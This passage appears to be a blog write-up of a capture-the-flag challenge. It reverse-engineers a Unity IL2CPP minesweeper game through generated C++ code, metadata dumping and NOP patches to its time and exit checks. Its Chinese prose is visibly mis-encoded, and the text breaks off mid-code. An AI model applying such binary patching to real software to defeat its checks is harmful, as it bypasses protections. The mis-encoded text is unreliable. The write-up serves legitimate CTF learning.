		<span class="token keyword">int64_t</span> L_2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_firstQueryTime_4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int32_t</span> L_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_expireIn_5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_subtract</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
    
IL_001b<span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>æ¯æ¬¡è°ƒç”¨ä¸€äº›å‡½æ•°ä¹‹å‰ä¸€èˆ¬ä¼šä½¿ç”¨ il2cpp_runtime_class_init ï¼ˆçŒœæµ‹æ˜¯åˆ›å»ºå¯¹è±¡ï¼‰ï¼Œç„¶åä½¿ç”¨ il2cpp_substract_xxx ç­‰å‡½æ•°å®ç°å¯¹å¯¹è±¡çš„æ“ä½œï¼Œéå¸¸å¥‡å¦™çš„æ„Ÿè§‰ï¼Œç”±æ­¤å¯ä»¥çœ‹å‡º <strong>åªè¦æˆ‘ä»¬åœ¨ il2cpp_runtime_class_init ä¸‹æ–­ç‚¹ï¼Œæˆ‘ä»¬å°±èƒ½çŸ¥é“ CheckIfExpiredï¼Œé€šè¿‡äº¤å‰å¼•ç”¨èƒ½æ‰¾åˆ°</strong>ã€‚</p>
<p>ä¸Šé¢æ‰€è¯´ä¸å¤±ä¸ºä¸€ç§æ–¹æ³•ï¼Œä½†æ˜¯äº‹å®æ˜¯ï¼Œå³ä½¿æ˜¯è°ƒè¯•åˆ° åªæœ‰ç‚¹å‡»åœ°é›·æ‰ä¼š ç¢°åˆ°æ–­ç‚¹çš„æ—¶å€™ï¼Œé€šè¿‡æ¡ä»¶æ–­ç‚¹ï¼Œæ—¥å¿—ï¼Œæˆ‘ä»¬èƒ½å‘ç° è°ƒç”¨äº† 15æ¬¡ il2cpp_runtime_class_init è€Œä»ä¸€å¼€å§‹è¿è¡Œçš„è¯è°ƒç”¨äº†å°†è¿‘ 50 æ¬¡ æ‰€ä»¥é€šè¿‡è¿™ä¸ªæ–¹æ³• æˆ‘ä»¬å¾€å¾€ä¼šåç¦»ç›®æ ‡ï¼Œè€Œä¸”æ‰¾åˆ°å‡½æ•°ä¹‹å æˆ‘ä»¬è¿˜è¦æ ¹æ®å‡½æ•°çš„é€»è¾‘å»æ¯”å¯¹ il2cpp æºç  å®åœ¨æ˜¯ç¦»è°±ã€‚ç”±æ­¤ æˆ‘ä»¬å¼•å…¥è€å¤§å“¥ã€‚ <em><strong>global-metadata.dat</strong></em></p>
<p>è¿™ä¸ªæ–‡ä»¶è®°è½½äº†ä¸€äº›è¢«è°ƒç”¨çš„å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰å‡½æ•°åä»¥åŠ åç§»ï¼Œè¿™ä¸ªæ–‡ä»¶æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œå…¶å®å¯ä»¥markä¸€ä¸‹</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">Il2CppGlobalMetadataHeader</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">int32_t</span> sanity<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> version<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralOffset<span class="token punctuation">;</span> <span class="token comment">// string data for managed code</span>
    <span class="token class-name">int32_t</span> stringLiteralCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralDataOffset<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralDataCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringOffset<span class="token punctuation">;</span> <span class="token comment">// string data for metadata</span>
    <span class="token class-name">int32_t</span> stringCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> eventsOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppEventDefinition</span>
    <span class="token class-name">int32_t</span> eventsCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> propertiesOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppPropertyDefinition</span>
    <span class="token class-name">int32_t</span> propertiesCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> methodsOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppMethodDefinition</span>
    <span class="token class-name">int32_t</span> methodsCount<span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>ç„¶åé€šè¿‡è°ƒè¯•å¾—çŸ¥ï¼Œä¼°è®¡è¿™ä¸ª Metadata æ–‡ä»¶æ˜¯åœ¨ UnityPlayer.dll ä¸­è½½å…¥çš„ï¼Œåä¹‹æˆ‘ä»¬ä¹Ÿèƒ½ä»ä¸­è¯»å–åˆ°ä¸€äº›ä¸œè¥¿ï¼Œç”šè‡³ç½‘ä¸Šå·²ç»æœ‰äº†å¯ä»¥ dump Metadata çš„å·¥å…· Il2cppDumper<br>hint 2: il2cpp ä¸­é—´æ–‡ä»¶ï¼ˆæºç ï¼‰å·²ç»ç›´æ¥ç»™äº†ï¼Œå°±ä¸å¤ªéœ€è¦ç”¨ il2cppdumper è¿™ç±»å·¥å…·å»æ­»æ€¼ GameAssembly.dll äº† å›§</p>
<p>å…¶å®æˆ‘ä¸çŸ¥é“é­”æ³•å°‘å¥³ä¸ºä»€ä¹ˆä¼šç»™è¿™ä¸ªhintï¼Œä¼°è®¡æ˜¯æ‹…å¿ƒæˆ‘ä»¬ç™½æ€¼ GameAssembly.dll ï¼Œå…¶å®æ­£å¸¸çš„æ€è·¯åº”è¯¥æ˜¯å»è§£å¯†é‚£ä¸ªåœ°é›·çŸ©é˜µï¼Œä¸è¿‡æˆ‘ä¸€è„‘å­æ‰è¿›å»å°±æ²¡åœä¸‹æ¥ï¼Œæœ€åé€ æˆè¿™ä¸ªç»“å±€ 233ã€‚ï¼ˆå…¶å® IL2CPP è¯»èµ·æ¥æœ‰ç‚¹åäººç±»ï¼Œæ‹¬å·å¤ªå¤šäº†ï¼Œçœ‹ç€å°±çƒ¦â€¦ï¼‰å…¶å®è¿™é‡Œæœ‰ä¸€ä¸ªå° Tip å¾…ä¼šå„¿å†è®²</p>
<p>é€šè¿‡ Il2cppDumper æˆ‘ä»¬å¯ä»¥å¾—åˆ°æºç çš„ dll , ä¸è¿‡å¹¶æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œå¤§å¤šåªæ˜¯æœ‰ åç§»åœ°å€ä¹‹ç±»çš„ ï¼Œä¸è¿‡è¿™æ ·ä¹Ÿè¶³å¤Ÿäº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/dump.jpg" alt="dump"></p>
<p>å†é€šè¿‡ dnspy æ‰“å¼€ è¿™ä¸ªdll</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/new.jpg" alt="new"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/old.jpg" alt="old"></p>
<p>ä¸¤ä¸ªå¯¹æ¯”å¾ˆæ˜æ˜¾ æˆ‘ä»¬å¾—åˆ°äº†å‡½æ•°åœ°å€ ï¼Œæœ€åå°±å¼€å§‹äº†é­”æ”¹ç¯èŠ‚ ã€‚</p>
<p>è¿™ä¸ªç¯èŠ‚è¯•é”™æ¯”è¾ƒå¤šï¼Œæˆ‘ä¹Ÿæ…¢æ…¢è®²</p>
<p>åœ¨ CS_Mouse_Brick å‡½æ•°ä¸­æˆ‘ä»¬ä¼šå‘ç° æ˜¯å¦å‘ç°ç‚¸å¼¹çš„ä¸¤æ¡åˆ†è·¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/first.jpg" alt="first"></p>
<p>è€Œåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬ä¼šå…ˆæ£€æµ‹ä¸€éæ—¶é—´ï¼Œæˆ‘å½“åœºå°±æŠŠä»–çš„å¯¹æˆ‘ä¸å¥½çš„é€»è¾‘ ç»™ nop æ‰äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/firstNop.jpg" alt="firstNop"></p>
<p>åªæ”¹äº†è¿™ä¸€å¤„ ä¼šå‘ç° æ—¶é—´è¿‡äº†ä¹‹åï¼Œä¸ç®¡ç‚¹ä»€ä¹ˆ ä»–éƒ½æ˜¯ç‚¸å¼¹ï¼ åŠ¨è°ƒäº†ä¸€ä¸‹ å‘ç°äº†åŸå› </p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/second_change.jpg" alt="second_change"></p>
<p>è¿™ä¸€æ®µåœ¨ CheckBombAt å‡½æ•°ä¸­ ï¼Œæ£€æµ‹åˆ°è¶…æ—¶ä¹‹åï¼Œè¿™é‡Œæœ¬æ¥ä¼šæŒ‡å‘åˆ«çš„åœ°æ–¹ï¼Œæœ€ç»ˆé€ æˆ ç‚¹å•¥éƒ½æ˜¯ç‚¸å¼¹ï¼Œæˆ‘å°±æŠŠè¿™é‡Œä¸¤ä¸ªé€»è¾‘éƒ½æ±‡èšåœ¨ä¸€èµ·ï¼Œè¿™æ ·è¿™ä¿©å°±éƒ½æ˜¯é­”æ³•å°‘å¥³äº†ã€‚</p>
<p>æœ€åæˆ‘ä»¬è¿˜éœ€ä¿®æ”¹ä¸€å¤„ï¼Œå°±æ˜¯å½“ç¨‹åºå‘ç°ä½ ç‚¹äº†é›·ï¼Œä»–å°±ä¼šç»ˆæ­¢ä½ æ¥ä¸‹æ¥çš„è¡Œä¸ºã€‚</p>
<p>è€Œè¿™ä¸ªé€»è¾‘æ˜¯åœ¨<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/final_change.jpg" alt="final_change"></p>
<p>å¦‚æœè¦é€€å‡ºä»–ä¼šç½® 1 é‚£æˆ‘åè¿‡æ¥ä¸è®©ä»–é€€å‡ºï¼Œæ‰€ä»¥æˆ‘å°±ç½® 0ï¼›æœ€åå°±æˆåŠŸåœ°åŠ«æŒäº†ç¨‹åºæµ</p>
<p>è¯è¯´æˆ‘åˆšæ‰è¯´äº† ï¼ˆåŠ«æŒï¼‰ ã€‚ã€‚ã€‚æˆ‘è¿™æ˜æ˜æ˜¯ ï¼ˆæŠ¢åŠ«ï¼‰</p>
<p>pwné‡Œé¢æ”¹ä¸äº†ç¨‹åºæµï¼Œå¤§å¤šé€šè¿‡æº¢å‡ºæ¥åŠ«æŒï¼Œå› æ­¤ç§°æˆ‘è¿™ä¸ªä¸º ï¼ˆæŠ¢åŠ«ï¼‰ ä¸€ç‚¹ä¸è¿‡åˆ†ã€‚</p>
<p>ç„¶åå°±æ˜¯æ‰‹é…¸çš„ç‚¹åœ°é›·äº† 233 ï¼Œå†æ˜¯æ‰‹é…¸çš„ç»˜åˆ¶ äºŒç»´ç äº†</p>
<p>æœ€åç»“æœ</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/YouLoser0.png" alt="YouLoser"></p>
<p>å…¶å®åªè¦ç¼©å°ä¸€ä¸‹å°±èƒ½æ‰«å‡ºæ¥ï¼Œè¿˜å¥½äºŒç»´ç å¯ä»¥æœ‰è¯¯å·®ï¼Œä¸ç„¶æˆ‘åªå¥½è£‚å¼€ã€‚</p>
<p>æ‰‹~~~å¥½é…¸å•Šï¼Œæˆ‘ä¸‹æ¬¡ä¸€å®šå»çœ‹çŸ©é˜µã€‚ã€‚ã€‚</p>
<p>å¥½äº†ï¼Œæœ€åæˆ‘å†æ”¶å›æˆ‘è¯´çš„ Tip æˆ‘ä»¬çœ‹å› il2cpp çš„æºç </p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">&#123;</span>
	<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_4 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_5 <span class="token operator">=</span> L_4<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_6 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_7 <span class="token operator">=</span> L_6<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_7<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_10 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_11 <span class="token operator">=</span> L_10<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_12 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_13 <span class="token operator">=</span> L_12<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_14 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_9<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_13<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_0 <span class="token operator">=</span> L_14<span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_15 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_16 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_17 <span class="token operator">=</span> L_16<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_18 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_19 <span class="token operator">=</span> L_18<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_15<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_20 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_15<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_17<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_19<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_1 <span class="token operator">=</span> L_20<span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_21 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_22 <span class="token operator">=</span> L_21<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_subtract</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">fmodf</span><span class="token punctuation">(</span>L_22<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_23 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_24 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_25 <span class="token operator">=</span> V_0<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_26 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_27 <span class="token operator">=</span> V_1<span class="token punctuation">;</span>
       <span class="token comment">//æ­¤æ³¨é‡Šæ²¡ä»€ä¹ˆç”¨ï¼Œè¯·å¿½ç•¥</span>
	<span class="token comment">//		L_8*L_23*L_24+L_25*L_26+L_27</span>
	<span class="token comment">// L_8  = GetAt(y1,x0/3,0)</span>
	<span class="token comment">// L_23 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_24 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_25 = GetAt(y1,x0/3,1)</span>
	<span class="token comment">// L_26 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_27 = GetAt(y1,x0/3,1)</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_23<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_24<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token 